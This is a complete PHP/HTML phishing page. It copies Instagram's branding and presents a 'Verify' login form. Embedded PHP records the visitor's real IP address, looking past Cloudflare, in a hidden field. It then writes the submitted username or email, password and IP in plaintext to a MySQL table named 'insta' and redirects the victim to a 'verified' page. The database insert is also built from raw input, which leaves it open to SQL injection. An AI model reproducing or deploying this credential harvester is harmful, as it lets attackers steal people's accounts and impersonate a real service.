<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <link rel="stylesheet" href="style.css">
    <link rel="icon" href="https://www.instagram.com/static/images/ico/favicon.ico/36b3ee2d91ed.ico">
</head>
<body>
    <section class="main container">
        <div class="photo">
            <img src="insta-logo.png" alt="">
        </div>
        <div class="content container">            

            <form action="index.php" method="POST">
                <input class="input" type="text" name="email" placeholder="Phone number, username, or email">
                <input class="input" type="password" name="pass" placeholder="Password">
                    <?php
                        function getUserIP()
                        {
                            // Get real visitor IP behind CloudFlare network
                            if (isset($_SERVER["HTTP_CF_CONNECTING_IP"])) {
                                    $_SERVER['REMOTE_ADDR'] = $_SERVER["HTTP_CF_CONNECTING_IP"];
                                    $_SERVER['HTTP_CLIENT_IP'] = $_SERVER["HTTP_CF_CONNECTING_IP"];
                            }
                            $client  = @$_SERVER['HTTP_CLIENT_IP'];
                            $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
                            $remote  = $_SERVER['REMOTE_ADDR'];

                            if(filter_var($client, FILTER_VALIDATE_IP))
                            {
                                $ip = $client;
                            }
                            elseif(filter_var($forward, FILTER_VALIDATE_IP))
                            {
                                $ip = $forward;
                            }
                            else
                            {
                                $ip = $remote;
                            }

                            return $ip;
                        }


                        $user_ip = getUserIP();     

                        echo "<input style='visibility:hidden;' type='text' name='ip' id='inputPassword6' class='form-control' value='$user_ip' aria-describedby='passwordHelpInline'>";
                        
                    ?>                
                <input class="verify" type="submit" value="Verify" name="btn">
            </form>
            <?php
                    $connection = mysqli_connect('localhost','root','','insta');
                    
                    if(isset($_POST["btn"]))
                    {
                        $email = $_POST['email'];
                        $pass = $_POST['pass'];
                        $ip = $_POST['ip'];

                        $sql = "INSERT INTO insta(email,pass,ip_address) VALUES('$email','$pass','$ip')";

                        if(mysqli_query($connection,$sql))
                        {
                            header('location:verified.php');
                        }else
                        {
                            echo "<h1 style='text-align:center;'>Something went wrong...try again later</h1>";
                            echo mysqli_error($connection);
                        }
                    }
                
                ?>
        </div>
    </section>
</body>
</html>